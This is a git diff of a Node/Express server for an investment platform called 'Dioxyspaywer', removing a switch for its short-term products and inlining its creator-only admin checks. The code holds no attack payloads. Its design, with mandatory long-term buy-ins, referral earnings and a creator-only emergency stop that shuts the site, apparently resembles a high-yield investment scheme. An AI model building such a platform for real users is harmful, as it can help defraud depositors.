@@ -9,7 +9,6 @@ const path = require('path');
 
 const User = require('./models/User');
 const Transaction = require('./models/Transaction');
-const SiteConfig = require('./models/SiteConfig'); // ✅ Import du nouveau modèle
 
 const app = express();
 const PORT = process.env.PORT || 5000;
@@ -21,16 +20,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 let isSiteActive = true;
 
 mongoose.connect(process.env.MONGO_URI)
-    .then(() => {
-        console.log('✅ MongoDB Connecté');
-        // Initialiser la config si elle n'existe pas au démarrage
-        SiteConfig.findOne().then(doc => {
-            if (!doc) {
-                SiteConfig.create({ isShortTermActive: true });
-                console.log('⚙️ Configuration du site initialisée (Produits CT activés par défaut).');
-            }
-        });
-    })
+    .then(() => console.log('✅ MongoDB Connecté'))
     .catch(err => {
         console.error('❌ Erreur MongoDB:', err);
         process.exit(1);
@@ -52,13 +42,6 @@ const authMiddleware = async (req, res, next) => {
     } catch (e) {
         return res.status(401).json({ error: 'Token invalide' });
     }
-};
-
-const adminMiddleware = async (req, res, next) => {
-    if (req.user.phone !== process.env.CREATOR_WALLET_PHONE) {
-        return res.status(403).json({ error: 'Accès réservé au créateur.' });
-    }
-    next();
 };
 
 app.get('/api/status', (req, res) => res.json({ active: isSiteActive }));
@@ -107,7 +90,7 @@ app.post('/api/register', async (req, res) => {
     }
 });
 
-// Connexion (Envoie l'état des produits courts termes)
+// Connexion (CALCUL DES GAINS À LA VOLÉE)
 app.post('/api/login', async (req, res) => {
     if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
     try {
@@ -187,10 +170,6 @@ app.post('/api/login', async (req, res) => {
 
         if (needsSave) await user.save();
 
-        // Récupérer l'état des produits courts termes
-        const config = await SiteConfig.findOne();
-        const isShortTermActive = config ? config.isShortTermActive : true;
-
         const token = jwt.sign({ id: user._id, role: user.role }, process.env.JWT_SECRET, { expiresIn: '24h' });
         const transactions = await Transaction.find({ userId: user._id }).sort({ date: -1 }).limit(50);
 
@@ -206,8 +185,7 @@ app.post('/api/login', async (req, res) => {
             shortTermProducts: user.shortTermProducts || [],
             referralCode: user.referralCode, referralCount: user.referralCount || 0,
             referralEarnings: user.referralEarnings || 0,
-            transactions: transactions,
-            isShortTermActive: isShortTermActive // ✅ Envoyé au frontend
+            transactions: transactions
         });
     } catch (e) {
         console.error(e);
@@ -215,7 +193,7 @@ app.post('/api/login', async (req, res) => {
     }
 });
 
-// Investissement (Vérifie si les CT sont actifs)
+// Investissement
 app.post('/api/invest', authMiddleware, async (req, res) => {
     try {
         const { productType, amount } = req.body;
@@ -225,12 +203,6 @@ app.post('/api/invest', authMiddleware, async (req, res) => {
         
         // Vérification Long Terme obligatoire pour les courts termes
         if (productType.startsWith('prod')) { 
-            // ✅ VÉRIFICATION SI LES PRODUITS COURTS TERMES SONT ACTIFS
-            const config = await SiteConfig.findOne();
-            if (!config || !config.isShortTermActive) {
-                return res.status(403).json({ error: 'Les produits courts termes sont actuellement indisponibles.' });
-            }
-
             if (!user.hasLongTerm || user.longTermFinished) {
                 return res.status(403).json({ error: 'Produit Long Terme obligatoire et actif.' });
             }
@@ -285,24 +257,6 @@ app.post('/api/invest', authMiddleware, async (req, res) => {
     } catch (e) {
         console.error(e);
         res.status(400).json({ error: e.message || 'Erreur investissement' });
-    }
-});
-
-// --- ROUTE ADMIN : BASCULER ÉTAT PRODUITS COURTS TERMES ---
-app.post('/api/admin/toggle-shortterm', authMiddleware, adminMiddleware, async (req, res) => {
-    try {
-        let config = await SiteConfig.findOne();
-        if (!config) {
-            config = await SiteConfig.create({ isShortTermActive: true });
-        }
-        // Inverser l'état
-        config.isShortTermActive = !config.isShortTermActive;
-        await config.save();
-        
-        res.json({ success: true, isActive: config.isShortTermActive, message: config.isShortTermActive ? 'Produits courts termes ACTIVÉS ✅' : 'Produits courts termes DÉSACTIVÉS ❌' });
-    } catch (e) {
-        console.error(e);
-        res.status(500).json({ error: 'Erreur lors du changement d\'état.' });
     }
 });
 
@@ -390,19 +344,16 @@ app.post('/api/withdraw', authMiddleware, async (req, res) => {
     }
 });
 
-// Admin Dashboard
-app.get('/api/admin/dashboard', authMiddleware, adminMiddleware, async (req, res) => {
+// Admin
+app.get('/api/admin/dashboard', authMiddleware, async (req, res) => {
+    if (req.user.phone !== process.env.CREATOR_WALLET_PHONE) return res.status(403).json({ error: 'Interdit' });
     const users = await User.find();
     const totalVault = users.reduce((a, b) => a + b.balance + (b.withdrawalBalance||0), 0);
-    const config = await SiteConfig.findOne();
-    res.json({ 
-        users, 
-        totalVault,
-        isShortTermActive: config ? config.isShortTermActive : true
-    });
+    res.json({ users, totalVault });
 });
 
-app.post('/api/admin/emergency-stop', authMiddleware, adminMiddleware, async (req, res) => {
+app.post('/api/admin/emergency-stop', authMiddleware, async (req, res) => {
+    if (req.user.phone !== process.env.CREATOR_WALLET_PHONE) return res.status(403).json({ error: 'Interdit' });
     isSiteActive = false;
     try {
         const creatorPhone = process.env.CREATOR_WALLET_PHONE;
@@ -418,4 +369,4 @@ app.post('/api/admin/emergency-stop', authMiddleware, adminMiddleware, async (re
     } catch (error) { res.status(500).json({ error: 'Erreur.' }); }
 });
 
-app.listen(PORT, () => console.log(`🚀 Serveur Dioxyspaywer démarré sur le port ${PORT}`));
+app.listen(PORT, () => console.log(` Serveur Dioxyspaywer démarré sur le port ${PORT}`));
